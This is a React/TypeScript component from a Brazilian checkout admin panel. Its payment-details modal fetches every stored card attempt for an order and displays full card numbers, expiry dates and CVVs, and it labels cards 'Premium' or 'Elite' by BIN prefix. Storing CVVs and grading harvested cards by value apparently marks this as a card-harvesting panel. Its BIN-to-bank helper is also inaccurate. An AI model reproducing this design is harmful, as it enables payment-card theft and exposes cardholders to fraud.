import React from "react";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";
import { Order, CreditCardData } from "@/types/checkout";
import StatusBadge from "../StatusBadge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { CreditCard } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useState, useEffect } from "react";
import CardAttemptDetails from "./CardAttemptDetails";

interface PaymentDetailsModalProps {
  order: Order | null;
  open: boolean;
  onClose: () => void;
}

// Helper function to get bank name from BIN
const getBankFromBin = (bin: string | undefined): string => {
  if (!bin) return "Desconhecido";
  
  // Sample mapping of BIN ranges to bank names
  // This should be expanded with more accurate data
  if (bin.startsWith("4")) return "Visa";
  if (bin.startsWith("5")) return "Mastercard";
  if (bin.startsWith("34") || bin.startsWith("37")) return "American Express";
  if (bin.startsWith("6")) return "Discover";
  
  return "Outro";
};

// Updated helper function to get card level with more appealing emojis
const getCardLevel = (bin: string | undefined, brand: string | undefined): string => {
  if (!bin) return '🌟 Básico';
  
  if (brand?.toLowerCase() === "visa" && bin.startsWith("4")) {
    if (bin.startsWith("49")) return '💎 Premium';
    if (bin.startsWith("43")) return '🏆 Elite';
  }
  
  if (brand?.toLowerCase() === "mastercard" && bin.startsWith("5")) {
    if (bin.startsWith("55")) return '💎 Premium';
    if (bin.startsWith("53")) return '🏆 Elite';
  }
  
  return '🌟 Básico';
};

const PaymentDetailsModal: React.FC<PaymentDetailsModalProps> = ({
  order,
  open,
  onClose,
}) => {
  const [allCardData, setAllCardData] = useState<CreditCardData[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  useEffect(() => {
    const fetchAllCardAttempts = async () => {
      if (order?.id && open && order.paymentMethod === "creditCard") {
        setIsLoading(true);
        
        try {
          const { data, error } = await supabase
            .from('card_data')
            .select('*')
            .eq('order_id', order.id)
            .order('created_at', { ascending: false });
            
          if (error) {
            console.error('Error fetching card attempts:', error);
            return;
          }
          
          if (data) {
            const formattedCardData = data.map(card => ({
              holderName: card.holder_name,
              number: card.number,
              expiryDate: card.expiry_date,
              cvv: card.cvv,
              bin: card.bin,
              brand: card.brand,
              createdAt: card.created_at
            }));
            
            setAllCardData(formattedCardData);
          }
        } catch (e) {
          console.error('Error in card data fetch:', e);
        } finally {
          setIsLoading(false);
        }
      }
    };
    
    fetchAllCardAttempts();
  }, [order?.id, open, order?.paymentMethod]);

  if (!order) return null;
  
  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md md:max-w-lg">
        <DialogHeader>
          <DialogTitle className="flex items-center">
            {order.paymentMethod === "creditCard" && <CreditCard className="mr-2 h-4 w-4" />}
            Dados do Pagamento
          </DialogTitle>
          <DialogDescription>
            Informações detalhadas do pagamento.
          </DialogDescription>
        </DialogHeader>
        <div className="space-y-4 py-2">
          <div className="grid grid-cols-3 gap-4 text-sm">
            <div className="font-medium text-gray-500">Produto:</div>
            <div className="col-span-2">{order.productName}</div>
          </div>
          <div className="grid grid-cols-3 gap-4 text-sm">
            <div className="font-medium text-gray-500">Valor:</div>
            <div className="col-span-2">
              {new Intl.NumberFormat("pt-BR", {
                style: "currency",
                currency: "BRL",
              }).format(Number(order.productPrice))}
            </div>
          </div>
          <div className="grid grid-cols-3 gap-4 text-sm">
            <div className="font-medium text-gray-500">Método:</div>
            <div className="col-span-2">
              {order.paymentMethod === "pix" ? "PIX" : "Cartão de Crédito"}
            </div>
          </div>
          <div className="grid grid-cols-3 gap-4 text-sm">
            <div className="font-medium text-gray-500">Status:</div>
            <div className="col-span-2">
              <StatusBadge status={order.status} />
            </div>
          </div>
          <div className="grid grid-cols-3 gap-4 text-sm">
            <div className="font-medium text-gray-500">Data:</div>
            <div className="col-span-2">
              {format(new Date(order.createdAt), "dd/MM/yyyy HH:mm", {
                locale: ptBR,
              })}
            </div>
          </div>
          {order.asaasPaymentId && (
            <div className="grid grid-cols-3 gap-4 text-sm">
              <div className="font-medium text-gray-500">ID do Pagamento:</div>
              <div className="col-span-2">{order.asaasPaymentId}</div>
            </div>
          )}
          
          {/* Credit Card Details with new component */}
          {order.paymentMethod === "creditCard" && (
            <>
              <div className="border-t pt-3 my-3">
                <h4 className="font-medium mb-3 flex items-center">
                  <CreditCard className="mr-2 h-4 w-4" />
                  {allCardData.length > 1 
                    ? `Dados dos Cartões (${allCardData.length} tentativas)` 
                    : "Dados do Cartão"}
                </h4>
                
                {isLoading ? (
                  <div className="text-center py-4">
                    <div className="animate-spin h-5 w-5 border-2 border-primary border-t-transparent rounded-full mx-auto"></div>
                    <p className="text-sm text-gray-500 mt-2">Carregando tentativas de cartão...</p>
                  </div>
                ) : (
                  allCardData.length > 0 ? (
                    <div className="grid gap-4">
                      {allCardData.map((cardData, index) => (
                        <CardAttemptDetails 
                          key={index}
                          cardData={cardData}
                          attemptNumber={index + 1}
                          status={order.status}
                        />
                      ))}
                    </div>
                  ) : (
                    <div className="text-center py-4 text-gray-500">
                      Nenhum dado de cartão disponível.
                    </div>
                  )
                )}
              </div>
            </>
          )}
        </div>
        <DialogFooter>
          <Button onClick={onClose}>Fechar</Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};

export default PaymentDetailsModal;
